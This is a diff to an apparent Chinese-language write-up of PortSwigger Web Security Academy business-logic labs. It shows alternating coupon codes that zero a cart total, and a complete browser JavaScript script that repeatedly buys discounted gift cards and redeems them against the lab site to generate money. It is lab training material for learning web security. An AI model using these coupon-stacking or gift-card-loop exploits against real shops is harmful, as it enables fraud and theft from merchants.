@@ -202,6 +202,129 @@ fetch(
 
 成功拿到 Admin panel 權限～
 
+## Lab: Flawed enforcement of business rules
+
+| Dimension | Description                                                                                                    |
+| --------- | -------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/logic-flaws/examples#domain-specific-flaws                                |
+| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules |
+
+新戶禮：NEWCUST5
+註冊禮：SIGNUP30
+
+輪流使用的話，就可以無限的使用
+
+| Name                              | Price     | Quantity |
+| --------------------------------- | --------- | -------- |
+| Lightweight "l33t" Leather Jacket | $1337.00  | 1        |
+| SIGNUP30                          | -$401.10  |          |
+| NEWCUST5                          | -$5.00    |          |
+| SIGNUP30                          | -$401.10  |          |
+| NEWCUST5                          | -$5.00    |          |
+| SIGNUP30                          | -$401.10  |          |
+| NEWCUST5                          | -$5.00    |          |
+| SIGNUP30                          | -$401.10  |          |
+| **Total**                         | **$0.00** |          |
+
+## Lab: Infinite money logic flaw
+
+| Dimension | Description                                                                              |
+| --------- | ---------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/logic-flaws/examples#domain-specific-flaws          |
+| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money |
+
+這題我搞了好久，找不到 Gift cards 要怎麼兌換，後來看了 Solution 的第一步驟，瞬間恍然大悟，原來有個商品就叫做 Gift Card
+
+$10 的 Gift Card 可以兌換 $10，但如果用 SUGNUP30 就可以打七折，算起來買一張就可以賺 $3，所以可以寫一個 JS 來刷錢
+
+```js
+function applyCoupon() {
+  return fetch(
+    "https://0a16002504a949a3801253d100d600c3.web-security-academy.net/cart/coupon",
+    {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
+      },
+      body: "csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX&coupon=SIGNUP30",
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+      redirect: "manual",
+    },
+  );
+}
+function addGiftCardsToCart(qty = 10) {
+  return fetch(
+    "https://0a16002504a949a3801253d100d600c3.web-security-academy.net/cart",
+    {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
+      },
+      body: `productId=2&quantity=${qty}&redir=CART`,
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+      redirect: "manual",
+    },
+  );
+}
+function checkoutAndGetGiftCardCodes() {
+  return fetch(
+    "https://0a16002504a949a3801253d100d600c3.web-security-academy.net/cart/checkout",
+    {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
+      },
+      body: "csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX",
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+    },
+  )
+    .then((res) => res.text())
+    .then((htmlText) => {
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(htmlText, "text/html");
+      const table = doc.querySelector("table.is-table-numbers");
+      const rows = [...table.tBodies[0].rows];
+      const codes = rows.map((row) => row.cells[0].innerText);
+      const filteredCodes = codes.filter((code) => code !== "Code");
+      return filteredCodes;
+    });
+}
+function redeem(code) {
+  return fetch(
+    "https://0a16002504a949a3801253d100d600c3.web-security-academy.net/gift-card",
+    {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
+      },
+      body: `csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX&gift-card=${code}`,
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+      redirect: "manual",
+    },
+  );
+}
+async function main() {
+  const qty = 99;
+  await addGiftCardsToCart(qty);
+  await applyCoupon();
+  const codes = await checkoutAndGetGiftCardCodes();
+  const usableCodes = codes.slice(0, qty);
+  console.log({ usableCodes });
+  for (const code of usableCodes) {
+    await redeem(code);
+  }
+  console.log("end");
+}
+```
+
+用瀏覽器 JS 的好處是，有現成的 `DOMParser` 可以用，解析 htmlString 就不需要 regex，其實 python 的 beautifulSoup 跟 npm 的 Dompurify 也是同樣的概念吧（？都有類似 `HTMLParser` 或是 `DOMParser` 的概念
+
+然後這題的 update email 功能，還有 Email Client 都是 "紅鯡魚謬誤"
+
 ## 參考資料
 
 - https://portswigger.net/web-security/host-header
